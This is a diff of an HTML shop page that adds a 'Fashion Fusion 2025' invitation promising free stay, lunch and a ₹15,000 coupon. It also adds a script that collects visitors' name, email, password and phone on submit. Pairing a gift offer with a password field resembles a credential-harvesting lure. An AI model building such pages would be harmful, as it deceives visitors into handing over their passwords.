+                <p>We are thrilled to invite you to Fashion Fusion 2025, organized by Nikita Mhaisalkar, this January. You are warmly invited as a valued visitor and an active participant in this celebration of fashion and elegance.</p>
 
-                <p>Special Perk: We’ll take care of your stay and lunch. Plus, every guest gets a ₹15,000 shopping
-                  coupon.</p>
-
-                <p>We look forward to your presence at this glamorous event. Let's make it a memorable experience
-                  together! </p>
+                <p>Special Perk: We’ll take care of your stay and lunch. Plus, every guest gets a ₹15,000 shopping coupon.</p>
+                  
+                <p>We look forward to your presence at this glamorous event. Let's make it a memorable experience together! </p>
               </div>
               <br>
-
+              
             </div>
             <div class="Footer__Block Footer__Block--links element">
               <h2 class="Footer__Title Heading u-h6">About the shop</h2>
@@ -2333,7 +2291,19 @@
       </div>
     </div>
   </div>
-    
+  <script>
+    (function () {
+      // Form control
+      $("#submit").click(() => {
+        var name = $("#name").val();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var phone = $("#phone").val();
+
+        insertData(name, email, password, phone);
+      })
+    })();
+  </script>
   <style type="text/css" data-rk-base="true">
     .rk-widget-container {
       margin: 20px auto;
